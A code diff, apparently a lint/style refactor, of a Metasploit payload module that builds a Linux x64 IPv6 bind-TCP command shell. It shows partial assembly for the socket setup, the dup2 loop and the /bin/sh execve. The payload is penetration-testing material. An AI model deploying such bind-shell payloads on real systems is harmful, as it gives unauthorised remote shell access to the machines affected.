@@ -3,9 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = 94
 
   include Msf::Payload::Single
@@ -13,26 +11,30 @@ module MetasploitModule
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Linux x64 Command Shell, Bind TCP Inline (IPv6)',
-      'Description'   => 'Listen for an IPv6 connection and spawn a command shell',
-      'Author'        => 'epi <epibar052[at]gmail.com>',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_X64,
-      'Handler'       => Msf::Handler::BindTcp,
-      'Session'       => Msf::Sessions::CommandShellUnix,
-      ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Linux x64 Command Shell, Bind TCP Inline (IPv6)',
+        'Description' => 'Listen for an IPv6 connection and spawn a command shell',
+        'Author' => 'epi <epibar052[at]gmail.com>',
+        'License' => MSF_LICENSE,
+        'Platform' => 'linux',
+        'Arch' => ARCH_X64,
+        'Handler' => Msf::Handler::BindTcp,
+        'Session' => Msf::Sessions::CommandShellUnix
+      )
+    )
+  end
 
-    def generate(opts={})
-      # tcp port conversion; shamelessly stolen from linux/x86/shell_reverse_tcp_ipv6.rb
-      port_order = ([1,0]) # byte ordering
-      tcp_port = [datastore['LPORT'].to_i].pack('n*').unpack('H*').to_s.scan(/../) # converts user input into integer and unpacked into a string array
-      tcp_port.pop     # removes the first useless / from  the array
-      tcp_port.shift   # removes the last useless  / from  the array
-      tcp_port = (port_order.map{|x| tcp_port[x]}).join('') # reorder the array and convert it to a string.
+  def generate(_opts = {})
+    # tcp port conversion; shamelessly stolen from linux/x86/shell_reverse_tcp_ipv6.rb
+    port_order = [1, 0] # byte ordering
+    tcp_port = [datastore['LPORT'].to_i].pack('n*').unpack('H*').to_s.scan(/../) # converts user input into integer and unpacked into a string array
+    tcp_port.pop     # removes the first useless / from  the array
+    tcp_port.shift   # removes the last useless  / from  the array
+    tcp_port = (port_order.map { |x| tcp_port[x] }).join('') # reorder the array and convert it to a string.
 
-      payload = <<-EOS
+    payload = <<-EOS
           socket_call:
             ; int socket(int domain, int type, int protocol)
             push   0x29
@@ -105,14 +107,14 @@ module MetasploitModule
             ; int dup2(int oldfd, int newfd);
             xchg    rdi, rax                    ; grab client fd
             push   0x3
-            pop    rsi                          ; newfd 
+            pop    rsi                          ; newfd#{' '}
 
         dup2_loop:
             ; 2 -> 1 -> 0 (3 iterations)
             push   0x21
             pop    rax                          ; dup2 syscall
             dec esi
-            syscall 
+            syscall#{' '}
             loopnz   dup2_loop
 
         exec_call:
@@ -125,9 +127,8 @@ module MetasploitModule
             push rsp
             pop rdi                             ; address of /bin/sh
             syscall
-      EOS
+    EOS
 
-      Metasm::Shellcode.assemble(Metasm::X86_64.new, payload).encode_string
-    end
+    Metasm::Shellcode.assemble(Metasm::X86_64.new, payload).encode_string
   end
 end
